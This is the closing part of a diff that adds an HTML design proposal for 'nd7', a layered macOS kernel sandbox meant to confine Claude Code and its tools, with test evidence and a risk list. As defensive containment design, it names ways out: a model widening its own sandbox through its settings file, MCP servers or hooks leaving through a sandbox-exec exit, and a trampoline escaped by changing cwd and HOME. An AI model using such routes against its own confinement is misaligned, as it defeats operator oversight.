+    <p>These run inside the claude process, not in a shell. Only the floor applies. The write is refused with EPERM and the model reports it. Widening for these needs a restart under a wider floor with <code>--resume</code>, about 3 seconds.</p>
+    <p class="who">Handled by <span class="tag t-floor">floor</span> only</p>
+  </div>
+  <div class="card">
+    <h4>User wants to grant a directory mid-session</h4>
+    <p><code>nd7 allow ~/data</code> in another terminal. The next Bash call runs under the widened policy. For Claude Code's own layer the user uses <code>/sandbox</code> as today. No restart, no UI beyond the command line.</p>
+    <p class="who">Handled by <span class="tag t-ours">nd7 policy</span> and <span class="tag t-cc">Claude Code</span></p>
+  </div>
+  <div class="card">
+    <h4>Claude Code's sandbox fails to start or is turned off</h4>
+    <p>Previously the worst outcome: it disabled itself silently. Now the floor still holds and the prefix still routes every Bash command through nd7's policy, so per-call confinement continues with ours instead of theirs.</p>
+    <p class="who">Handled by <span class="tag t-ours">nd7 policy</span> then <span class="tag t-floor">floor</span></p>
+  </div>
+  <div class="card">
+    <h4>A future Claude Code release enforces its sandbox</h4>
+    <p>It works under the floor because <code>sandbox-exec</code> has an exit. This was the dependency the earlier design could not remove; the three-layer design does not have it.</p>
+    <p class="who">Handled by <span class="tag t-cc">Claude Code</span> inside <span class="tag t-floor">floor</span></p>
+  </div>
+  <div class="card">
+    <h4>The model edits <code>.claude/settings.json</code> to widen its own sandbox</h4>
+    <p>Claude Code's sandbox refuses Bash writes to its own settings file. Even if it did not, the floor is not read from that file. Tested from inside a sandboxed Bash: <code>PermissionError</code>.</p>
+    <p class="who">Handled by <span class="tag t-cc">Claude Code</span> then <span class="tag t-floor">floor</span></p>
+  </div>
+  <div class="card">
+    <h4>A compromised MCP server or hook script</h4>
+    <p>These live in the outer tree with the claude process. They are confined by the floor, but the floor has the two exits, so code running there could exec <code>sandbox-exec</code> and leave. Claude Code trusts these fully today, so this is no worse than the status quo. State it plainly.</p>
+    <p class="who">Handled by <span class="tag t-floor">floor</span>, with a known gap <span class="tag t-deny">exit reachable</span></p>
+  </div>
+  <div class="card">
+    <h4>Another agent entirely (not Claude Code)</h4>
+    <p>The floor and the trampoline are agent-agnostic. What is missing is the middle layer and the prefix hook; nd7's policy then covers Bash through a PATH shim instead. Same policy engine, same log.</p>
+    <p class="who">Handled by <span class="tag t-floor">floor</span> and <span class="tag t-ours">nd7 policy</span></p>
+  </div>
+</div>
+
+<h3>Compared with the alternatives that were spiked</h3>
+<table>
+<thead><tr><th>Approach</th><th>Per-call confinement</th><th>Mid-session grant</th><th>Covers claude process, MCP, hooks</th><th>Survives Claude Code enforcing its sandbox</th><th>Extra moving parts</th></tr></thead>
+<tbody>
+<tr><td>Claude Code sandbox alone</td><td>yes</td><td>yes, via /sandbox</td><td>no</td><td>n/a</td><td>none</td></tr>
+<tr><td>nd7 floor alone, restart to widen</td><td>no</td><td>restart + --resume, ~3 s</td><td>yes</td><td>no, breaks</td><td>none</td></tr>
+<tr><td>Broker daemon (spike A)</td><td>yes</td><td>yes</td><td>yes</td><td>no</td><td>daemon, unix socket, fd passing</td></tr>
+<tr><td><strong>Three layers with trampoline</strong></td><td>yes, theirs and ours</td><td>yes, next call</td><td>yes</td><td><strong>yes</strong></td><td>two profile rules, one env var, one binary you already ship</td></tr>
+<tr><td>Linux microVM (Tier 2)</td><td>yes</td><td>yes</td><td>yes, by construction</td><td>yes</td><td>image, shared filesystem, credentials inside, no Apple-platform builds</td></tr>
+</tbody>
+</table>
+
+<h2 id="selling">Why nd7, then</h2>
+<p>If Claude Code already sandboxes commands, what does nd7 add? Four things, and none of them is "a second sandbox".</p>
+<div class="sell">
+  <div><h4>A floor the agent cannot move</h4><p>Claude Code's sandbox is configured by settings the session can read and, in places, write, and it degrades to "off" when it cannot start. The floor is set by the operator, enforced by the kernel, and applies to the claude process itself, its file tools, MCP servers and hooks, which Claude Code's sandbox never covered.</p></div>
+  <div><h4>Policy derived from evidence</h4><p>nd7 already records every tool call. The floor and the per-call policy are rendered from what recorded sessions actually touched, and <code>nd7 denials</code> shows exactly which rule each denial would need. Hand-written allowlists are looser and less explainable.</p></div>
+  <div><h4>Dynamic without a daemon</h4><p>The trampoline gives kernel-enforced per-call policy that can change between two commands, with no long-lived service, no socket protocol and no UI beyond a shell command. The only process outside the boundary is the one that started the session.</p></div>
+  <div><h4>Agent-agnostic, tiered</h4><p>Nothing in the floor or the trampoline is specific to Claude Code; the prefix is merely the most convenient hook. The same policy engine renders a Seatbelt profile today, and a VM configuration in Tier 2, from the same recorded sessions.</p></div>
+</div>
+
+<h2 id="evidence">Evidence</h2>
+<p>All runs on Darwin 25.6.0 with Claude Code 2.1.278 and nd7 at commit <code>56a9fc8</code>. Nine claude sessions, about $1.53 in API spend. Full commands and outputs are in the three spike reports in the scratchpad.</p>
+<table class="evidence">
+<thead><tr><th>Claim</th><th>How it was checked</th><th>Result</th></tr></thead>
+<tbody>
+<tr><td>a confined process cannot apply a different profile</td><td>nested nd7 run with looser, tighter, superset, subset, other params</td><td>all EPERM; identical profile accepted as no-op</td></tr>
+<tr><td>(with no-sandbox) exec leaves the sandbox</td><td>outer profile naming nd7; nested sandbox-exec inside the child</td><td>child unsandboxed; can apply any fresh profile</td></tr>
+<tr><td>per-call profile differs from the outer one</td><td>trampoline applying a stricter and a looser profile</td><td>both applied and enforced</td></tr>
+<tr><td>Claude Code passes each Bash command to the shell prefix</td><td>logging prefix under claude -p</td><td>one argv element, snapshot preamble included</td></tr>
+<tr><td>mid-session widening in one session</td><td>policy appended while claude slept between two Bash writes</td><td>write 1 denied, write 2 allowed, model reported it</td></tr>
+<tr><td>naive trampoline escapes via caller cwd and HOME</td><td>cd / and HOME=/private/tmp before calling it</td><td>both escaped; fixed by ancestry-resolved session record</td></tr>
+<tr><td>direct trampoline call is still policed</td><td>Bash invoking the trampoline without the prefix</td><td>session policy applied</td></tr>
+<tr><td>Claude Code's sandbox runs under the floor</td><td>sandbox-exec exit + Claude Code sandbox enabled</td><td>started; $HOME denied, project write ok</td></tr>
+<tr><td>no exit reachable from Claude Code's sandboxed Bash</td><td>sandbox-exec allow-all from Bash</td><td>sandbox_apply: Operation not permitted</td></tr>
+<tr><td>settings.json cannot be widened from Bash</td><td>python edit from a sandboxed Bash</td><td>PermissionError from Claude Code's sandbox</td></tr>
+<tr><td>prefix runs inside Claude Code's sandbox</td><td>sandbox_check probe in the prefix</td><td>1 (confined); trampoline must pass through</td></tr>
+<tr><td>escape hatch lands on the floor, prefix still applies</td><td>dangerouslyDisableSandbox retry</td><td>prefix ran unsandboxed by Claude Code; $HOME write denied by floor</td></tr>
+<tr><td>App Sandbox extension tokens work under our profile</td><td>issue outside, consume inside</td><td>denied write became allowed; children inherit (kept in reserve)</td></tr>
+<tr><td>minimal floor for claude to run</td><td>iterate on kernel denials</td><td>+ keychain service, ~/.claude writes, /private/tmp/claude-* writes</td></tr>
+<tr><td>per-call cost</td><td>20 trampolined runs of true</td><td>≈ 23 ms each, one profile compile</td></tr>
+</tbody>
+</table>
+
+<h2 id="risks">Risks and open items</h2>
+<ul>
+  <li><strong><code>no-sandbox</code> is undocumented.</strong> Apple uses it in its own profiles, which is good evidence it will not vanish casually, but it is not API. If it ever goes, the floor-alone design remains and Tier 2 covers the rest.</li>
+  <li><strong>The shell prefix is a Claude Code feature.</strong> Claude Code documents it and reasons about it explicitly, but it could change. Fallback is a PATH shim for the shell.</li>
+  <li><strong>Two exits in the floor.</strong> Code running in the outer tree, MCP servers and hooks, can exec <code>sandbox-exec</code> and leave. This matches Claude Code's own trust model but should be stated in the docs. An option is to make the sandbox-exec exit conditional on the user enabling Claude Code's sandbox at all.</li>
+  <li><strong>Signals.</strong> The floor needs <code>(allow signal)</code> for Claude Code to kill timed-out commands; restricting to children leaves orphans. The trampoline applying the profile to itself and exec'ing in-process removes the grandchild that would be orphaned.</li>
+  <li><strong>Process listing.</strong> <code>ps</code> and <code>pgrep</code> are denied under deny-default. Whether Claude Code needs them is untested.</li>
+  <li><strong>Excluded commands.</strong> Claude Code's excludedCommands setting did not take effect in the non-interactive run, so that path is unverified. It should behave like the escape hatch, which was verified.</li>
+  <li><strong>Terminals.</strong> Any interactive use needs <code>(allow file-ioctl)</code>. Seatbelt's <code>(trace)</code> is dead on this OS; denials come from the unified log.</li>
+  <li><strong>Write and Edit stay static.</strong> Dynamic grants reach shells, not the claude process. Restart with <code>--resume</code> covers it in about 3 seconds. A hook-based redirect is possible but awkward.</li>
+</ul>
+
+<h2 id="glossary">Glossary</h2>
+<table>
+<tbody>
+<tr><td>Seatbelt</td><td>The macOS kernel sandbox. A process applies a profile with <code>sandbox_init</code>; the kernel enforces it on that process and all descendants.</td></tr>
+<tr><td>SBPL</td><td>Sandbox Profile Language, the Scheme-like text a profile is written in: <code>(allow file-write* (subpath …))</code>.</td></tr>
+<tr><td>Profile</td><td>One compiled SBPL policy. A process tree has exactly one, fixed at the moment it is applied.</td></tr>
+<tr><td>Trampoline</td><td>A small trusted program you exec in order to be bounced into a different execution context. Here: the nd7 binary, the one exec the floor allows to leave the sandbox.</td></tr>
+<tr><td>no-sandbox</td><td>The SBPL exec modifier that makes the exec'd program run unsandboxed: <code>(allow process-exec (with no-sandbox) (literal …))</code>.</td></tr>
+<tr><td>Floor</td><td>nd7's outer profile over the whole tree. The boundary that holds when everything above it fails or is bypassed.</td></tr>
+<tr><td>Shell prefix</td><td><code>CLAUDE_CODE_SHELL_PREFIX</code>, a program Claude Code puts in front of every Bash tool command, receiving the whole command as one argument.</td></tr>
+<tr><td>Escape hatch</td><td>Claude Code's <code>dangerouslyDisableSandbox</code> parameter: the model may ask to run one command outside Claude Code's sandbox, subject to a permission prompt.</td></tr>
+<tr><td>Session record</td><td>What <code>nd7 run</code> writes for the trampoline: root pid, resolved project and home paths, current policy. Lives where the floor denies writes.</td></tr>
+<tr><td>Extension token</td><td>App Sandbox's kernel-issued grant for one path, consumed at runtime by a confined process. Verified working; held in reserve.</td></tr>
+</tbody>
+</table>
+
+<footer>Spike reports: REPORT-A (broker prototype), REPORT-B (Claude Code under nd7 run), REPORT-C (trampoline and coexistence). Nothing in this proposal is committed to the repository.</footer>
+</div>
